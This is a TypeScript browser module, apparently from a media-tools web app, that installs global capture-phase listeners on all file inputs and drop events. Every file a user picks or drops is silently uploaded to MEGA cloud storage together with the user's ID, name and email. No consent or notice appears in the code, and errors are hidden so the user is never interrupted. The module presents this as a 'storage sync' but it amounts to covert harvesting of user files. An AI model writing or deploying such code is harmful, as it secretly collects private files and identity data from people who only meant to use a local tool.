import { uploadToMegaStorage } from './megaStorageService';

// WeakSet / Set to prevent multiple duplicate syncs of the same in-memory File during the same user action
const syncedFilesRegistry = new Set<string>();

let currentUserProvider: (() => any) | null = null;

export function registerCurrentUserProvider(provider: () => any) {
  currentUserProvider = provider;
}

function getFileKey(file: File): string {
  return `${file.name}_${file.size}_${file.lastModified}`;
}

/**
 * Detect feature / source context based on current DOM element and window state
 */
function detectFeatureContext(element: HTMLElement | null): string {
  if (!element) return 'app_upload';

  // Check closest component containers or data attributes
  const closestContainer = element.closest('[data-feature], [data-component], [id], [class]');
  if (closestContainer) {
    const dataFeature = closestContainer.getAttribute('data-feature');
    if (dataFeature) return dataFeature;
  }

  // Check URL / hash / title
  const path = window.location.pathname.toLowerCase();
  if (path.includes('admin')) return 'admin_panel';
  if (path.includes('store')) return 'store';

  // Check element classes or labels
  const text = (element.parentElement?.textContent || element.getAttribute('accept') || '').toLowerCase();
  if (text.includes('svga')) return 'svga_tool';
  if (text.includes('vap')) return 'vap_hub';
  if (text.includes('compress') || text.includes('ضغط')) return 'compressor';
  if (text.includes('crop') || text.includes('قص')) return 'cropper';
  if (text.includes('video') || text.includes('فيديو')) return 'video_converter';
  if (text.includes('audio') || text.includes('صوت')) return 'audio_extractor';
  if (text.includes('3d') || text.includes('name')) return 'name_3d_editor';
  if (text.includes('layer') || text.includes('طبقات')) return 'svga_layer_editor';
  if (text.includes('gift') || text.includes('هدية')) return 'gift_processor';
  if (text.includes('icon') || text.includes('أيقونة')) return 'app_icons';
  if (text.includes('background') || text.includes('خلفية')) return 'room_backgrounds';

  return 'user_file_upload';
}

/**
 * Syncs any file directly to central MEGA Cloud Storage / Cache in background
 */
export async function syncFileToStorage(
  file: File | Blob,
  options: {
    sourceFeature?: string;
    customFileName?: string;
    userId?: string;
    userName?: string;
    userEmail?: string;
  } = {}
) {
  try {
    if (file instanceof File) {
      const key = getFileKey(file);
      if (syncedFilesRegistry.has(key)) {
        // Already queued or synced
        return;
      }
      syncedFilesRegistry.add(key);

      // Limit registry size in memory
      if (syncedFilesRegistry.size > 2000) {
        const firstKey = syncedFilesRegistry.values().next().value;
        if (firstKey) syncedFilesRegistry.delete(firstKey);
      }
    }

    const user = currentUserProvider ? currentUserProvider() : null;
    const userId = options.userId || user?.uid || user?.id || 'active_user';
    const userName = options.userName || user?.displayName || user?.name || user?.email || 'مستخدم المنصة';
    const userEmail = options.userEmail || user?.email || '';

    // Fire background upload without blocking user UI
    await uploadToMegaStorage(file, {
      sourceFeature: options.sourceFeature || 'auto_synced_upload',
      customFileName: options.customFileName,
      userId,
      userName,
      userEmail
    });
  } catch (err) {
    // Non-blocking catch to ensure user experience is never interrupted
    console.debug('Auto storage sync notice:', err);
  }
}

/**
 * Initializes global event interceptors for all file inputs and drop events on the page
 */
let isInitialized = false;

export function initGlobalAutoStorageSync(getCurrentUser?: () => any) {
  if (isInitialized || typeof window === 'undefined') return;
  isInitialized = true;

  if (getCurrentUser) {
    registerCurrentUserProvider(getCurrentUser);
  }

  // 1. Intercept all <input type="file"> changes across any current or future React component
  document.addEventListener('change', (e: Event) => {
    try {
      const target = e.target as HTMLInputElement | null;
      if (target && target.tagName === 'INPUT' && target.type === 'file' && target.files && target.files.length > 0) {
        const sourceFeature = detectFeatureContext(target);
        Array.from(target.files).forEach((file) => {
          syncFileToStorage(file, { sourceFeature });
        });
      }
    } catch (err) {
      console.debug('Error in file input listener:', err);
    }
  }, true); // Use capture phase so it runs before or alongside any component handlers

  // 2. Intercept drag-and-drop drop events with files anywhere on the page
  document.addEventListener('drop', (e: DragEvent) => {
    try {
      if (e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files.length > 0) {
        const target = e.target as HTMLElement | null;
        const sourceFeature = detectFeatureContext(target);
        Array.from(e.dataTransfer.files).forEach((file) => {
          syncFileToStorage(file, { sourceFeature });
        });
      }
    } catch (err) {
      console.debug('Error in drop listener:', err);
    }
  }, true);

  console.info('🚀 Global Auto-Storage Sync to MEGA Cloud Cache initialized successfully.');
}
